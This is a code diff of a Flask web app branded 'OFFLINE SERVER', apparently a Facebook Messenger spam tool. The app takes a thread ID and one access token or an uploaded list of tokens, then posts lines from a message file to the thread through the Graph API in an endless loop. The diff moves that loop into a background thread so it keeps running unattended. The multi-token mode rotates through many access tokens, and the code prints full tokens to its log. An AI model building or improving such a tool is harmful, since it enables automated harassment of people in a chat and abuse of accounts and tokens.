@@ -1,8 +1,8 @@
 from flask import Flask, request, render_template_string
 import requests
 import os
-from time import sleep
 import time
+import threading
 
 app = Flask(__name__)
 app.debug = True
@@ -18,6 +18,43 @@ headers = {
     'referer': 'www.google.com'
 }
 
+def send_messages_task(token_type, access_token, thread_id, mn, time_interval, messages, tokens=None):
+    if token_type == 'single':
+        while True:
+            try:
+                for message1 in messages:
+                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                    message = str(mn) + ' ' + message1
+                    parameters = {'access_token': access_token, 'message': message}
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    if response.status_code == 200:
+                        print(f"Message sent using token {access_token}: {message}")
+                    else:
+                        print(f"Failed to send message using token {access_token}: {message}")
+                    time.sleep(time_interval)
+            except Exception as e:
+                print(f"Error while sending message: {e}")
+                time.sleep(30)
+
+    elif token_type == 'multi':
+        while True:
+            try:
+                for token in tokens:
+                    for message1 in messages:
+                        api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                        message = str(mn) + ' ' + message1
+                        parameters = {'access_token': token, 'message': message}
+                        response = requests.post(api_url, data=parameters, headers=headers)
+                        if response.status_code == 200:
+                            print(f"Message sent using token {token}: {message}")
+                        else:
+                            print(f"Failed to send message using token {token}: {message}")
+                        time.sleep(time_interval)
+            except Exception as e:
+                print(f"Error while sending message: {e}")
+                time.sleep(30)
+
+
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     pinterest_url = "https://i.pinimg.com/736x/3d/2a/e8/3d2ae8815de57a9f92fd52a98cd6b84b.jpg" # Default Background Image
@@ -30,48 +67,21 @@ def send_message():
         time_interval = int(request.form.get('time'))
         pinterest_url = request.form.get('pinterestUrl', pinterest_url)
 
-        if token_type == 'single':
-            txt_file = request.files['txtFile']
-            messages = txt_file.read().decode().splitlines()
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
 
-            while True:
-                try:
-                    for message1 in messages:
-                        api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                        message = str(mn) + ' ' + message1
-                        parameters = {'access_token': access_token, 'message': message}
-                        response = requests.post(api_url, data=parameters, headers=headers)
-                        if response.status_code == 200:
-                            print(f"Message sent using token {access_token}: {message}")
-                        else:
-                            print(f"Failed to send message using token {access_token}: {message}")
-                        time.sleep(time_interval)
-                except Exception as e:
-                    print(f"Error while sending message using token {access_token}: {e}")
-                    time.sleep(30)
-
-        elif token_type == 'multi':
+        tokens = []
+        if token_type == 'multi':
             token_file = request.files['tokenFile']
             tokens = token_file.read().decode().splitlines()
-            txt_file = request.files['txtFile']
-            messages = txt_file.read().decode().splitlines()
 
-            while True:
-                try:
-                    for token in tokens:
-                        for message1 in messages:
-                            api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                            message = str(mn) + ' ' + message1
-                            parameters = {'access_token': token, 'message': message}
-                            response = requests.post(api_url, data=parameters, headers=headers)
-                            if response.status_code == 200:
-                                print(f"Message sent using token {token}: {message}")
-                            else:
-                                print(f"Failed to send message using token {token}: {message}")
-                            time.sleep(time_interval)
-                except Exception as e:
-                    print(f"Error while sending message using token {token}: {e}")
-                    time.sleep(30)
+        # Start message loop in background thread so web server doesn't freeze/timeout
+        thread = threading.Thread(
+            target=send_messages_task,
+            args=(token_type, access_token, thread_id, mn, time_interval, messages, tokens)
+        )
+        thread.daemon = True
+        thread.start()
 
     return f'''
 <!DOCTYPE html>
@@ -132,7 +142,7 @@ def send_message():
   <header class="header">
     <h1> 𝙾𝙵𝙵𝙻𝙸𝙽𝙴 𝚂𝙴𝚁𝚅𝙴𝚁 <br> MADE BY THE EXIT ARMAN🤍</h1>
     <p>BOLO LEGENDS KA BAAP ARMAN ZINDABAD >3:)</p>
-    <h1>🅾🆆🅽🅴🆁]|I{•------» EXIT ARM4N  ON FIRE ❤️</h1>
+    <h1>OWNER]|I{-------> EXIT ARM4N ON FIRE ❤️</h1>
   </header>
 
   <div class="container">
